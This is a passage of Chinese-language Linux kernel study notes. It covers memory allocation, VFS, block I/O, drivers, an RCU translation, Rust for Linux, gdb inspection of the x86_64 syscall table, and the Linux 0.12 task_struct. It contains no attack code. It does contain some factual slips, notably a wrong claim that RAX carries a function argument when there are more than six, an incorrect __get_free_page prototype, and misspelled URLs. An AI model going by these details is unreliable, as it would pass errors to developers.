<p><strong>不要用定时器实现任何硬实时任务</strong>。一般来说定时器在超时后会马上执行，但是也可以推迟（但是绝对不会提前）。</p>
<h2 id="第十二章-内存管理"><a class="header" href="#第十二章-内存管理">第十二章 内存管理</a></h2>
<p>在内存中分配内存比在用户控件要复杂的多。</p>
<p>内核把物理页作为内存管理的基本单位。内核用<a href="https://elixir.bootlin.com/linux/v5.16/source/include/linux/mm_types.h#L71"><code>struct page</code></a>表示系统中每个物理页。</p>
<p>必须要理解的一点是<code>page</code>结构与物理页相关，而并非与虚拟页相关。因此，该结构对页的描述只是短暂的。即使页中所包含的数据继续存在，由于交换等原因，他们可能也不再和同一个<code>page</code>结构关联。内核仅仅用这个数据结构来描述当前时刻在物理页中存放的东西。这种数据结构的目的在于描述物理内存本身，而不是描述包含在其中的数据。</p>
<p>由于硬件的限制，内核并不能对所有的页一视同仁，所以<strong>内核把页划分成不同的区zone</strong>，内核使用zone对具有相似特性的page进行分组。</p>
<p>定义在<a href="https://elixir.bootlin.com/linux/latest/source">/</a><a href="https://elixir.bootlin.com/linux/latest/source/include">include</a>/<a href="https://elixir.bootlin.com/linux/latest/source/include/linux">linux</a>/<a href="https://elixir.bootlin.com/linux/latest/source/include/linux/gfp.h">gfp.h</a>。</p>
<p>分配页</p>
<pre><code class="language-c">/* 分配 2^order 个 pages，返回第一页的地址 */
unsigned long __get_free_pages(gfp_t gfp_mask, usigned int order);
/* 分配 2^order 个 page，返回第一页struct page* */
struct page* alloc_pages(gfp_t gfp_mask, usigned int order);
/* 分配 1 个 pages，返回第一页的逻辑地址 */
unsigned long __get_free_page(gfp_t gfp_mask, usigned int order);
/* 分配 1 个 page，返回第一页struct page* */
struct page* alloc_page(gfp_t gfp_mask);
/* 分配 1 个 page，数据全部填充成0。返回给用户空间的页需要填充为0 */
unsigned long get_zeroed_page(unsigned int gfp_mask);
/* 把 page 转换成逻辑地址 */
void* page_address(struct page* page);
</code></pre>
<p>释放页</p>
<pre><code class="language-c">void __free_pages(struct page*page, unsigned int order);
void free_pages(unsigned long addr,unsigned int order);
void free_page(unsigned long addr);
</code></pre>
<h3 id="kmalloc"><a class="header" href="#kmalloc">kmalloc</a></h3>
<p>之前介绍的接口，对于需要分配整个页的情况可能是比<code>kmalloc</code>更好的选择。但是对于大多数的内核分配来说，<a href="https://elixir.bootlin.com/linux/latest/source/include/linux/slab.h#L576"><code>kmalloc</code></a>用得更多。它返回一个指向内存块的指针，内存块至少有<code>size</code>大小，分配的内存在物理上是连续的。在出错时，它返回NULL，也就意味着没有足够的内存可用了。</p>
<pre><code class="language-c">static __always_inline __alloc_size(1) 
    void *kmalloc(size_t size, gfp_t flags);
</code></pre>
<p><code>gfp_t flag</code><strong>常用</strong>的宏，不知道有没有过时。在绝大多数代码中，我们只需要用到<code>GFP_KERNEL</code>和<code>GFP_ATOMIC</code>。</p>
<p><img src="Advanced/Linux/LinuxKernel/../images/image-20220201133514129.png" alt="Which flag to use when" /></p>
<p>和<code>kmalloc</code>配套使用的是<code>kfree</code></p>
<pre><code class="language-c">void kfree(const void *objp);
</code></pre>
<h3 id="vmalloc"><a class="header" href="#vmalloc">vmalloc</a></h3>
<p><code>vmalloc</code>类似<code>kmalloc</code>，但是**<code>vmalloc</code>分配的虚拟地址是连续的，物理地址无需连续，这类似于用户空间分配函数<code>malloc</code>。而<code>kmalloc</code>保证物理地址和虚拟地址都是连续的**。</p>
<p>定义在<a href="https://elixir.bootlin.com/linux/latest/source">/</a><a href="https://elixir.bootlin.com/linux/latest/source/include">include</a>/<a href="https://elixir.bootlin.com/linux/latest/source/include/linux">linux</a>/<a href="https://elixir.bootlin.com/linux/latest/source/include/linux/vmalloc.h">vmalloc.h</a>。</p>
<pre><code class="language-c">void *vmalloc(unsigned long size) __alloc_size(1);
void vfree(const void *addr);
</code></pre>
<p>出于性能的考虑，很多内核代码即使不需要物理地址连续的内存，也使用<code>kmalloc</code>。<code>vmalloc</code>只在不得已时才会使用——比如获得大块内存时。</p>
<h3 id="slab"><a class="header" href="#slab">slab</a></h3>
<p>分配和释放数据结构是内核中最普遍的操作之一。为了便于数据的频繁分配和挥手，编程人员常常会用到空闲链表。当代码需要一个新的数据结构时，可以从空闲链表中抓取一个而不需要分配内存，再把数据放进去。当不需要这个数据结构的实例时，把它放回空闲链表而不是释放它。但是空闲链表面临的主要问题是不能全局控制，让不同的空闲链表统筹操作，释放内存出来使用。所以，Linux提供了slab，通用的数据结构缓存层。</p>
<pre><code class="language-c">struct kmem_cache *kmem_cache_create(const char *name, unsigned int size,
                                     unsigned int align, slab_flags_t flags,
                                     void (*ctor)(void *));
void kmem_cache_destroy(struct kmem_cache *s);
void *kmem_cache_alloc(struct kmem_cache *s, gfp_t flags) __assume_slab_alignment __malloc;
void kmem_cache_free(struct kmem_cache *s, void *objp);
</code></pre>
<h3 id="栈"><a class="header" href="#栈">栈</a></h3>
<p>内核栈小且固定。所以不要在栈上进行大量的静态分配（大型数组或大型结构体），否则栈溢出会覆盖掉邻接堆栈末端的东西，<code>thread_info</code>和其他的数据。</p>
<h2 id="第十三章-虚拟文件系统"><a class="header" href="#第十三章-虚拟文件系统">第十三章 虚拟文件系统</a></h2>
<p>Inode对象包含了内核在操作文件或目录时需要的全部信息。对于Unix风格的文件系统来说这些信息可以从磁盘inode节点直接读入，但是如果磁盘上文件系统没有inode，也需要从中提取信息。也就是说，无论如何inode都会在内存中创立。</p>
<p>书介绍了四大数据结构的全部的接口，可以作为参考。</p>
<p>还介绍了和进程相关的数据结构</p>
<ul>
<li><code>file_struct</code>，主要是存储打开的文件，<code>fdt</code>。</li>
<li><code>fs_struct</code>，这里存储了<code>root</code>根目录路径，<code>pwd</code>当前工作目录的路径，<code>in_exec</code>当前正在执行的文件</li>
<li><code>namespace</code>，<strong>他使得每一个进程在系统中都看到唯一的安装文件系统，不仅是唯一的根目录，而且是唯一的文件系统层次结构</strong>。</li>
</ul>
<h2 id="第十四章-块io层"><a class="header" href="#第十四章-块io层">第十四章 块I/O层</a></h2>
<p>能够随机（不按顺序）访问固定大小的数据片的设备称为<strong>块设备</strong>，比如硬盘。按照字符流的顺序被有序访问的称为<strong>字符设备</strong>，比如串口和键盘。</p>
<p>设备最小的寻址单元是<strong>扇区sector</strong>。不过内核中磁盘操作的基本单元是<strong>块block</strong>。一般来说sector是512B的大小，不过也有不同的。block的大小要求是sector的2的整数倍而小于page size（不确定现在的内核是否还有这个限制），所以一般是512B, 1KB, 4KB。</p>
<p>当一个块被调入内存时，也就是 在读入后或等待写出时，它存储在一个<strong>缓冲区</strong>中。用一个<a href="https://elixir.bootlin.com/linux/latest/source/include/linux/buffer_head.h#L60"><code>buffer_head</code></a>结构体存储缓冲区的元信息(他曾今用来在一个page中映射一个block，但是现在我们使用bio，而将buffer_head用来extracting block mappings)。<a href="https://elixir.bootlin.com/linux/latest/source/include/linux/blk_types.h#L237"><code>bio</code></a>结构体代表了正在或等待的以segment link list形式组织的<strong>块IO操作</strong>。</p>
<p>内核会对IO进行调度。</p>
<h2 id="十五章-进程地址空间"><a class="header" href="#十五章-进程地址空间">十五章 进程地址空间</a></h2>
<p>进程地址空间指的就是每个用户空间进程看到的内存。内核使用<a href="https://elixir.bootlin.com/linux/latest/source/include/linux/mm_types.h#L467"><code>mm_struct</code></a>描述进程的地址空间，定义在 <a href="https://elixir.bootlin.com/linux/latest/source">/</a><a href="https://elixir.bootlin.com/linux/latest/source/include">include</a>/<a href="https://elixir.bootlin.com/linux/latest/source/include/linux">linux</a>/<a href="https://elixir.bootlin.com/linux/latest/source/include/linux/mm_types.h">mm_types.h</a>中。一些有趣的字段</p>
<pre><code class="language-c">/* list of VMAs */
struct vm_area_struct *mmap;
/* rb tree of VMAs */
struct rb_root mm_rb;
/* 代码段，数据段 */
unsigned long start_code, end_code, start_data, end_data;
/* 栈，堆 */
unsigned long start_brk, brk, start_stack;
/* 参数，环境变量 */
unsigned long arg_start, arg_end, env_start, env_end;
</code></pre>
<p><strong><code>mmap</code>作为链表，利于简单高效的遍历所有元素，而<code>mm_rb</code>作为红黑树，方便搜索指定元素。<code>current-&gt;mm</code>指向当前进程的内存描述符，<code>fork()</code>函数利用<code>copy_mm</code>复制父进程的内存描述符。通常每个进程都有唯一的<code>mm_struct</code>，即唯一的进程地址空间，如果父进程希望和其他子进程共享地址空间，可以在<code>clone()</code>时，设置<code>CLONE_VM</code>标识，这样就是线程了</strong>。</p>
<h2 id="十六章-页高速缓存和页回写"><a class="header" href="#十六章-页高速缓存和页回写">十六章 页高速缓存和页回写</a></h2>
<p>页高速缓存cache是Linux内核实现磁盘缓存的方式。他用来减少对磁盘的IO操作，将物理内存作为磁盘的cache。</p>
<p><code>address_space</code>用来管理新对象缓存项和页IO操作。</p>
<h2 id="十七章-模块与设备"><a class="header" href="#十七章-模块与设备">十七章 模块与设备</a></h2>
<p>设备被分为：</p>
<ul>
<li>块设备</li>
<li>字符设备</li>
<li>网络设备：打破了一切皆文件的原则，可以通过套接字API这样的特殊接口来访问。</li>
</ul>
<p>设备模型的核心部分是<a href="https://elixir.bootlin.com/linux/latest/source/include/linux/kobject.h#L64"><code>kobject</code></a>。sysfs是处于内存中的一个虚拟文件系统，他为我们提供了<code>kobject</code>对象层次结构的视图。</p>
<p><code>BUG_ON()</code>有点类似<code>assert!</code>，提供断言的作用。</p>
<h2 id="十八章-调试"><a class="header" href="#十八章-调试">十八章 调试</a></h2>
<p>printk可以设置打印频率，否则可能会因为太多的打印让系统负载过高。</p>
<pre><code class="language-c">static unsigned long prev_jiffy = jiffies;/* 频率限制 */
if (time_after(jiffies, prev_jiffy + 2*HZ)) {
    prev_jiffy = jiffies;
    printk(KERN_ERR &quot;blah blah blah\n&quot;) 
}
</code></pre>
<p>git的二分查找</p>
<pre><code>git bisect
</code></pre>
<h2 id="十九章-移植性"><a class="header" href="#十九章-移植性">十九章 移植性</a></h2>
<ul>
<li>int的长度，在Linux当前支持的体系结构中都是32位的。（待考证）</li>
<li>short的长度，在Linux当前支持的体系结构中都是16位的。（待考证）</li>
<li>不要假设指针和long的长度。</li>
</ul>
<p>有一些用typedef定义的类型，<strong>请不要将该类型转换成C标准类型，当做一个不知道长度的类型就好</strong>。</p>
<p>对于一些 知道明确长度的变量，用</p>
<div class="table-wrapper"><table><thead><tr><th>类型</th><th>描述</th></tr></thead><tbody>
<tr><td>s8</td><td>带符号字节</td></tr>
<tr><td>u8</td><td>无符号字节</td></tr>
<tr><td>s16</td><td>带符号16位整数</td></tr>
<tr><td>u16</td><td>无符号16位整数</td></tr>
<tr><td>s32</td><td>带符号32位整数</td></tr>
<tr><td>u32</td><td>无符号32位整数</td></tr>
<tr><td>s64</td><td>带符号64位整数</td></tr>
<tr><td>u64</td><td>无符号64位整数</td></tr>
</tbody></table>
</div>
<p>注意SMP，内核抢占，高端内存的使用。</p>
<hr />
<ul>
<li>http://www.lwn.net/ Linux新闻周刊</li>
<li>http://www.kemel.org 内核代码库的官方站点</li>
<li>http://kemelnewbies.org/</li>
</ul>
<p>编码风格，使用8个字符长度的制表符缩进。K&amp;R风格。每行不超过80个字符，用下面的命令可以使用Linux编码风格。</p>
<pre><code>indent -kr -i8 -ts8 -sob -180 -ss -bs -psi &lt;file&gt;
</code></pre>
<p>注释规范：Documentation/kemel-doc-nano-HOWTO.txt</p>
<p>多用现成的东西，不要重复造轮子。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="linux设备驱动笔记"><a class="header" href="#linux设备驱动笔记">《Linux设备驱动》笔记</a></h1>
<p>小心双下划线开头的函数名。通常是一个低层的接口组件，应当小心使用。双下划线是为了提醒程序员：“除非你很清楚你要做什么，否则请不要调用他。”</p>
<p>构建内核时，在内核文档目录下的文件 Documentation/Changes 列出了需要的工具版本，供参考。 编译器的版本太新可能会引起和太老的版本引起的一样的问题。内核源码对于编译器做了很大的假设, 新的发行版本有时会一时地破坏东西。</p>
<p>模块是紧密结合到一个特殊内核版本的数据结构和函数原型上的。模块见到的接口可能一个内核版本与另一个有很大差别。书里也推荐使用宏来制作适配多个内核版本的模块。也就是比较下面两个宏，他们都是整数</p>
<pre><code class="language-c">KERNEL_VERSION(major,minor,release); 
LINUX_VERSION_CODE;		# 内核代码
</code></pre>
<p>不过，处理不兼容的最好的方式是把它们限制到特定的头文件。作为一个通用的原则，版本(或者平台)依赖的代码应当隐藏在一个低级的宏定义或者函数后面。高层的代码就可以只调用这些函数，而不必关心低层的细节。这样书写的代码易读并且更健壮。</p>
<h2 id="内核模块介绍"><a class="header" href="#内核模块介绍">内核模块介绍</a></h2>
<h3 id="描述性定义"><a class="header" href="#描述性定义">描述性定义</a></h3>
<p>可以在模块中包含的其他描述性定义有：</p>
<ul>
<li>MODULE_AUTHOR ( 声明谁编写了模块 ), </li>
<li>MODULE_DESCRIPION( 一个人可读的关于模块做什么的声明 ), </li>
<li>MODULE_VERSION ( 一个代码修订版本号; 看 &lt;linux/module.h&gt; 的注释以便知道创建版本字串使用的惯例), </li>
<li>MODULE_ALIAS ( 模块为人所知的另一个名子 ) </li>
<li>MODULE_DEVICE_TABLE ( 来告知用户空间, 模块支持那些设备 ).</li>
</ul>
<p>在错误处理的时候，<code>goto</code>是经常被使用的。</p>
<h3 id="参数"><a class="header" href="#参数">参数</a></h3>
<p>定义参数。<code>module_param(变量名,类型,权限掩码)</code>这个权限值控制谁可以存取这些模块参数在 <code>sysfs</code> 中的表示。</p>
<pre><code class="language-c">static char *whom = &quot;world&quot;; 
static int howmany = 1; 
module_param(howmany, int, S_IRUGO); 
module_param(whom, charp, S_IRUGO);
</code></pre>
<p>传递参数</p>
<pre><code class="language-sh">insmod hello howman=10 whom=&quot;Mom&quot;
</code></pre>
<h2 id="用户态驱动"><a class="header" href="#用户态驱动">用户态驱动</a></h2>
<p>并不是所有的驱动都可以在用户态完成。</p>
<p>用户空间驱动的好处在于: </p>
<ul>
<li>完整的 C 库可以连接. 驱动可以进行许多奇怪的任务, 不用依靠外面的程序(实现使用策略的工具程序, 常常随着驱动自身发布). </li>
<li>程序员可以在驱动代码上运行常用的调试器, 而不必走调试一个运行中的内核的弯路. </li>
<li>如果一个用户空间驱动挂起了, 你可简单地杀掉它. 驱动的问题不可能挂起整个系统, 除非被控制的硬件真的疯掉了. </li>
<li>用户内存是可交换的, 不象内核内存. 一个不常使用的却有很大一个驱动的设备不会占据别的程序可以用到的 RAM, 除了在它实际在用时. </li>
<li>一个精心设计的驱动程序仍然可以, 如同内核空间驱动, 允许对设备的并行存取. </li>
<li>如果你必须编写一个封闭源码的驱动, 用户空间的选项使你容易避免不明朗的许可的情况和改变的内核接口带来的问题.</li>
</ul>
<p>但是用户空间的设备驱动的方法有几个缺点. 最重要的是: </p>
<ul>
<li>中断在用户空间无法用. 在某些平台上有对这个限制的解决方法, 例如在 IA32 体系上的 vm86 系统调用. </li>
<li>只可能通过内存映射 <code>/dev/mem</code> 来使用 DMA, 而且只有特权用户可以这样做. </li>
<li>存取 I/O 端口只能在调用 ioperm 或者 iopl 之后. 此外, 不是所有的平台支持这些系统调用, 而存取<code>/dev/port</code> 可能太慢而无效率. 这些系统调用和设备文件都要求特权用户. </li>
<li>响应时间慢, 因为需要上下文切换在客户和硬件之间传递信息或动作. </li>
<li>更不好的是, 如果驱动已被交换到硬盘, 响应时间会长到不可接受. 使用 <code>mlock</code> 系统调用可能会有帮助, 但是常常的你将需要锁住许多内存页, 因为一个用户空间程序依赖大量的库代码.<code>mlock</code>也限制在授权用户上. </li>
<li>最重要的设备不能在用户空间处理, 包括但不限于, 网络接口和块设备.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="rcu"><a class="header" href="#rcu">RCU</a></h1>
<p>如果你去阅读Linux源码，经常能看到数据结构的名字带个<code>rcu</code>，所以他是做什么用的呢？</p>
<p>RCU(Read-Copy Update)，是 Linux 中比较重要的一种同步机制。顾名思义就是“读，拷贝更新”，再直白点是“随意读，但更新数据的时候，需要先复制一份副本，在副本上完成修改，再一次性地替换旧数据”。这是 Linux 内核实现的一种针对“读多写少”的共享数据的同步机制。RCU常被描述为读写锁的替代品，它的特点是读者并不需要直接与写者进行同步，读者与写者也能并发的执行。RCU的目标就是最大程度来减少读者侧的开销，因此也常用于对读者性能要求高的场景。</p>
<p>所以如果使用RCU，就可以做到任意的读。</p>
<h2 id="what-is-rcu-fundamentally-翻译"><a class="header" href="#what-is-rcu-fundamentally-翻译"><a href="https://lwn.net/Articles/262464/">What is RCU, Fundamentally?</a> (翻译)</a></h2>
<p>Read-copy update (RCU) 是一个同步(synchronization)机制，在2002年10月加入Linux内核。RCU通过让读写可以同时进行，增强了可扩展性。传统同步元语，比如Mutex保证了并发进程的互斥，但是不管数据是被读还是被更新，比如Reader-Writer lock，允许同时读但是在读的时候不允许更新。和他们相比，RCU允许很多读和一个更新同时发生。RCU通过维持很多版本的数据并保证在最后一个读者消失之前数据不会被释放，来<strong>保证读操作具有一致性</strong>。RCU 定义并使用了高效且可扩展的机制来发布和读取数据的新版本，以及推迟旧版本的回收。这些机制分散在读和更新中，让<strong>读变得非常的快</strong>。在某些场景（非抢占式内核）中，RCU的读操作没有任何额外开销。</p>
<p>RCU由三个基础的机制组成，第一个机制是为了插入，第二个机制是为了删除，第三个机制允许读能和插入删除同时进行。这些机制在下面几节介绍，以链表为例。</p>
<h3 id="publish-subscribe-mechanism"><a class="header" href="#publish-subscribe-mechanism">Publish-Subscribe Mechanism</a></h3>
<p>RCU的一个关键特征是能够安全的读取数据，就算数据同时正在被修改。为了提供这种能力，RCU使用了<strong>Publish-Subscribe机制</strong>。例如，考虑一个一开始为<code>NULL</code>的global pointer <code>gp</code>，正在被改成指向一个新分配和初始化的内存。</p>
<pre><code class="language-c">struct foo {
    int a;
    int b;
    int c;
}
struct foo *gp = NULL;
/* ... */
p = kmalloc(sizeof(*p),GFP_KERNEL);
p-&gt;a = 1;
p-&gt;b = 2;
p-&gt;c = 3;
gp = p;
</code></pre>
<p>不幸的是，第9到第12行并<strong>不一定会顺序执行</strong>。如果<code>gp = p</code>被提前执行了，那么同时发生的读操作就会看到<code>gp</code>中未被初始化的字段。你可能想到使用memory barriers来让这些操作顺序执行，但是它非常难以使用。因此，我们使用<code>rcu_assign_pointer</code>对他们进行封装。9到12行改成</p>
<pre><code class="language-c">p-&gt;a = 1;
p-&gt;b = 2;
p-&gt;c = 3;
rcu_assign_pointer(gp, p);
</code></pre>
<p><code>rcu_assign_pointer</code>会publish一个新的struct，强制compiler和CPU执行对<code>gp</code>的赋值发生在对<code>p</code>的字段的引用之后。不过显然，只对更新的顺序做保证是不够的，读操作必须也要满足合理的顺序。考虑下面的代码</p>
<pre><code class="language-c">p = gp;
if (p!=NULL) {
    do_something(p-&gt;a, p-&gt;b, p-&gt;c);
}
</code></pre>
<p>虽然上面的代码看起来免疫乱序，然而，the [DEC Alpha CPU <a href="http://www.rdrop.com/users/paulmck/scalability/paper/ordering.2007.09.19a.pdf">PDF]</a> and value-speculation compiler optimizations 可以让<code>p-&gt;a</code>,<code>p-&gt;b</code>,<code>p-&gt;c</code>的值比<code>p</code>的值先取到。比如，在value-speculation优化中，编译器推测<code>p</code>的值，然后取到<code>p-&gt;a</code>,<code>p-&gt;b</code>,<code>p-&gt;c</code>的值，再取到真正<code>p</code>的值取验证推测的正确性。</p>
<p><a href="https://www.cnblogs.com/LoyenWang/p/12681494.html">Linux RCU原理剖析（一）-初窥门径</a></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="rust-for-linux"><a class="header" href="#rust-for-linux">Rust for linux</a></h1>
<p>现在是2021年，现在Rust for Linux刚刚起步。现在还不建议用Rust直接开发替换Linux的某些模块，建议从<strong>驱动</strong>这个内核的“叶子节点”入手。</p>
<h2 id="lkm-in-rust"><a class="header" href="#lkm-in-rust">LKM in Rust</a></h2>
<p>https://rust-for-linux.github.io/docs/kernel/</p>
<p>只导出了部分的接口。</p>
<h2 id="driver-in-rust"><a class="header" href="#driver-in-rust">Driver in Rust</a></h2>
<p>一个参考<a href="https://lwn.net/Articles/863459/">GPIO驱动代码</a> ，C和Rust对照。</p>
<h2 id="utilities-in-rust"><a class="header" href="#utilities-in-rust">Utilities in Rust</a></h2>
<p>有人用Rust重写了Utilities https://github.com/uutils/coreutils/blob/master/src/uu/ls/src/ls.rs</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="system-call"><a class="header" href="#system-call">System Call</a></h1>
<p>实验环境是x64上的Linux 5.4.161，使用gdb+qemu进行调试。</p>
<h2 id="调试"><a class="header" href="#调试">调试</a></h2>
<h3 id="找调用表"><a class="header" href="#找调用表">找调用表</a></h3>
<p>我们是64位系统，所以调用表是下面第二个。</p>
<pre><code class="language-sh">root@reticence-Magicbook:~# cat /proc/kallsyms | grep sys_call_table
ffffffff82000280 R x32_sys_call_table
ffffffff820013a0 R sys_call_table
ffffffff820023e0 R ia32_sys_call_table
</code></pre>
<p>然后我们在gdb查看系统调用表</p>
<pre><code class="language-assembly">gef➤  x/17xg sys_call_table
0xffffffff820013a0 &lt;sys_call_table&gt;:	0xffffffff812cb930	0xffffffff812cba50
0xffffffff820013b0 &lt;sys_call_table+16&gt;:	0xffffffff812c76a0	0xffffffff812c5a50
0xffffffff820013c0 &lt;sys_call_table+32&gt;:	0xffffffff812d0980	0xffffffff812d0ba0
0xffffffff820013d0 &lt;sys_call_table+48&gt;:	0xffffffff812d0a40	0xffffffff812e4be0
0xffffffff820013e0 &lt;sys_call_table+64&gt;:	0xffffffff812c9250	0xffffffff81036330
0xffffffff820013f0 &lt;sys_call_table+80&gt;:	0xffffffff8125e6e0	0xffffffff81259fe0
0xffffffff82001400 &lt;sys_call_table+96&gt;:	0xffffffff8125b2a0	0xffffffff810adb50
0xffffffff82001410 &lt;sys_call_table+112&gt;:	0xffffffff810a9a20	0xffffffff810302d0
0xffffffff82001420 &lt;sys_call_table+128&gt;:	0xffffffff812e1630
</code></pre>
<h3 id="查看某个调用过程"><a class="header" href="#查看某个调用过程">查看某个调用过程</a></h3>
<p><code>sys_ioctl</code>的调用号是16（<code>__NR_IOCTL == 16</code>），也就是上面列出的所有地址的最后一个。</p>
<pre><code class="language-sh">root@reticence-Magicbook:~# cat /proc/kallsyms | grep sys_ioctl
ffffffff812e15a0 T ksys_ioctl
ffffffff812e1630 T __x64_sys_ioctl		&lt;= 这个
ffffffff812e1650 T __ia32_sys_ioctl
ffffffff81344ac0 T __ia32_compat_sys_ioctl
ffffffff81344ce0 T __x32_compat_sys_ioctl
ffffffff82ad84a0 t _eil_addr___ia32_sys_ioctl
ffffffff82ad84b0 t _eil_addr___x64_sys_ioctl
ffffffff82ad92a0 t _eil_addr___x32_compat_sys_ioctl
ffffffff82ad92b0 t _eil_addr___ia32_compat_sys_ioctl
</code></pre>
<p>我们来看这个入口的代码，汇编更好看懂。</p>
<pre><code class="language-assembly">gef➤  disass
Dump of assembler code for function __x64_sys_ioctl:
=&gt; 0xffffffff812e1630 &lt;+0&gt;:		data16 data16 data16 xchg ax,ax
   0xffffffff812e1635 &lt;+5&gt;:		push   rbp
   0xffffffff812e1636 &lt;+6&gt;:		mov    rdx,QWORD PTR [rdi+0x60]
   0xffffffff812e163a &lt;+10&gt;:	mov    rsi,QWORD PTR [rdi+0x68]
   0xffffffff812e163e &lt;+14&gt;:	mov    rdi,QWORD PTR [rdi+0x70]
   0xffffffff812e1642 &lt;+18&gt;:	mov    rbp,rsp
   0xffffffff812e1645 &lt;+21&gt;:	call   0xffffffff812e15a0 &lt;ksys_ioctl&gt;
   0xffffffff812e164a &lt;+26&gt;:	pop    rbp
   0xffffffff812e164b &lt;+27&gt;:	cdqe   
   0xffffffff812e164d &lt;+29&gt;:	ret    
End of assembler dump.
</code></pre>
<ul>
<li><code>xchg ax,ax</code>: 可以认为是nop，什么也没做。</li>
<li><a href="https://www.felixcloutier.com/x86/cbw:cwde:cdqe"><code>cdqe</code></a>: Convert Doubleword to Quadword, RAX ← sign-extend of EAX.</li>
<li>是把参数从<code>rdi</code>指向的某块内存中读出来，作为参数再去调用<code>ksys_ioctl</code>。这个<code>rdi</code>是什么呢？他其实是<code>struct pt_regs*</code></li>
</ul>
<pre><code class="language-assembly">gef➤  p *(struct pt_regs*)$rdi
$40 = {
  r15 = 0x0,
  r14 = 0x564c9f50c160,
  r13 = 0xffffffffffffffff,
  r12 = 0x0,
  bp = 0x0,
  bx = 0x0,
  r11 = 0x246,
  r10 = 0x1,
  r9 = 0x564c9f50af60,
  r8 = 0x7fc71d2e58b0,
  ax = 0xffffffffffffffda,
  cx = 0x7fc71d00da81,
  dx = 0x7ffe047ad510,
  si = 0x5401,
  di = 0x0,
  orig_ax = 0x10,
  ip = 0x7fc71d00da81,
  cs = 0x33,
  flags = 0x246,
  sp = 0x7ffe047ad4e0,
  ss = 0x2b
}
</code></pre>
<p>我们之前常说，系统调用是把寄存器作为参数。不过在新版本的Linux中，<strong>寄存器是从栈上再加载出来的了</strong>。如果你要hook system call的话，需要多注意了。也就是说，其实系统调用表上的那个函数指针对应的函数原型是</p>
<pre><code class="language-c">long __x64_sys_xxx(struct pt_regs* regs);
</code></pre>
<p>你看源代码的话，会是一个宏。。。</p>
<h2 id="hook"><a class="header" href="#hook">Hook</a></h2>
<blockquote>
<p>System call codes are diffierent from version to version.
And also diffierent from architecture to architecture.
And also diffierent between x86_64 and x86_32, and also other 64-bit arch/ 32-bit arch</p>
<p>System call is reentrant, be careful with data race.
If arguments are MEMORY(aka pointer), you cannot use it directly. Translate it to kernel’s address space first.</p>
</blockquote>
<hr />
<p>Linux函数调用约定-x86_64</p>
<ul>
<li>一个函数在调用时，如果参数个数小于等于 6 个时，前 6 个参数是从左至右依次存放于 RDI，RSI，RDX，RCX，R8，R9 寄存器里面，剩下的参数通过栈传递，从右至左顺序入栈；</li>
<li>如果参数个数大于 6 个时，前 5 个参数是从左至右依次存放于 RDI，RSI，RDX，RCX，RAX 寄存器里面，剩下的参数通过栈传递，从右至左顺序入栈；</li>
<li>对于系统调用，使用 R10 代替 RCX；</li>
<li>所有通用寄存器 RAX、RBX、RCX、RDX、RBP、RSP、RSI、RDI、R8、R9、R10、R11、R12、R13、R14、R15。</li>
</ul>
<p>Linux系统调用约定-x86_64</p>
<ul>
<li>User-level applications use as integer registers for passing the sequence %rdi, %rsi, %rdx, %rcx, %r8 and %r9. The kernel interface uses %rdi, %rsi, %rdx, %r10, %r8 and %r9.</li>
<li>A system-call is done via the syscall instruction. The kernel destroys registers %rcx and %r11.</li>
<li>The number of the syscall has to be passed in register %rax.</li>
<li>System-calls are limited to six arguments, no argument is passed directly on the stack.</li>
<li>Returning from the syscall, register %rax contains the result of the system-call. A value in the range between -4095 and -1 indicates an error, it is -errno.</li>
<li>Only values of class INTEGER or class MEMORY are passed to the kernel.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="进程调度时的context_switch"><a class="header" href="#进程调度时的context_switch">进程调度时的context_switch</a></h1>
<h2 id="linux012的进程调度"><a class="header" href="#linux012的进程调度">Linux0.12的进程调度</a></h2>
<h3 id="数据结构task_structtss_struct"><a class="header" href="#数据结构task_structtss_struct">数据结构——task_struct,tss_struct</a></h3>
<p>首先是最重要的task_struct，也被称为PCB（Process Control Block进程控制块）或PD（Process Descriptor进程描述符）。
数据结构的定义就能学到好多。看到filp文件指针，还有指向当前工作目录的pwd，还有最基本的开头几个字段。</p>
<pre><code class="language-c">struct task_struct {
	/* these are hardcoded - don't touch */
	// 下面这几个字段是硬编码字段
	long state;							// 任务的运行状态(-1 不可运行,0 可运行(就绪), &gt;0 已停止)
	long counter;						// 任务运行时间计数(递减)(滴答数),运行时间片
	long priority;						// 优先数.任务开始运行时counter=priority,越大运行越长
	long signal;						// 信号位图,每个比特位代表一种信号,信号值=位偏移值+1
	struct sigaction sigaction[32];		// 信号执行属性结构,对应信号将要执行的操作和标志信息
	long blocked;						// 进程信号屏蔽码(对应信号位图)

	/* various fields */
	int exit_code;						// 任务执行停止的退出码,其父进程会取.
	unsigned long start_code;			// 代码段地址
	unsigned long end_code;				// 代码长度(字节数)
	unsigned long end_data;				// 代码长度+数据长度(字节数)
	unsigned long brk;					// 总长度(字节数)
	unsigned long start_stack;			// 堆栈段地址
	long pid;							// 进程标识号(进程号)
	long pgrp;							// 进程组号
	long session;						// 会话号
	long leader;						// 会话首领
	int	groups[NGROUPS];				// 进程所属组号.一个进程可属于多个组
	/*
	 * pointers to parent process, youngest child, younger sibling,
	 * older sibling, respectively.  (p-&gt;father can be replaced with
	 * p-&gt;p_pptr-&gt;pid)
	 */
	struct task_struct *p_pptr;			// 指向父进程的指针
	struct task_struct *p_cptr;			// 指向最新子进程的指针
	struct task_struct *p_ysptr;		// 指向比自己后创建的相邻进程的指针
	struct task_struct *p_osptr;		// 指向比自己早创建的相邻进程的指针
	unsigned short uid;					// 用户标识号(用户id)
	unsigned short euid;				// 有效用户id
	unsigned short suid;				// 保存的用户id
	unsigned short gid;					// 组标识号(级id)
	unsigned short egid;				// 有效级id
	unsigned short sgid;				// 保存的组id
	unsigned long timeout;				// 内核定时超时值
	unsigned long alarm;				// 报警定时值(滴答数)
	long utime;							// 用户态运行时间(滴答数)
	long stime;							// 系统态运行时间(滴答数)
	long cutime;						// 子进程用户态运行时间
	long cstime;						// 子进程系统态运行时间
	long start_time;					// 进程开始运行时刻.
	struct rlimit rlim[RLIM_NLIMITS];	// 进程资源使用统计数组.
	/* per process flags, defined below */
	unsigned int flags;					// 各进程的标志
	unsigned short used_math;			// 标志:是否使用了协处理器.
	
	/* file system info */
	/* -1 if no tty, so it must be signed */
	int tty;							// 进程使用tty终端的子设备号.-1表示没有使用
	unsigned short umask;				// 文件创建属性屏蔽位
